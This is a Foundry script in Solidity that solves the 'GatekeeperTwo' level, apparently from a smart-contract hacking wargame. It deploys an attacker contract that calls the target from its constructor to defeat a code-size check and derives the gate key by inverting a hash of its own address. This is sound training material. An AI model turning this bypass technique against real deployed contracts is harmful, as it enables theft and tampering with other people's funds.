// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract Attacker {
    constructor(address _gatekeeperTwoAddress) {
        GatekeeperTwo gatekeeperTwoContract = GatekeeperTwo(_gatekeeperTwoAddress);
        uint64 senderHash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = ~senderHash; // Bitwise NOT
        gatekeeperTwoContract.enter(bytes8(key));
    }
}

contract SolveGatekeeperTwo is Script {
    GatekeeperTwo public gatekeeperTwoContract;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        gatekeeperTwoContract = GatekeeperTwo(payable(vm.envAddress("GATEKEEPERTWO_ADDRESS")));

        // Deploy attacker contract which will execute the attack in its constructor
        new Attacker(address(gatekeeperTwoContract));

        vm.stopBroadcast();
    }
}

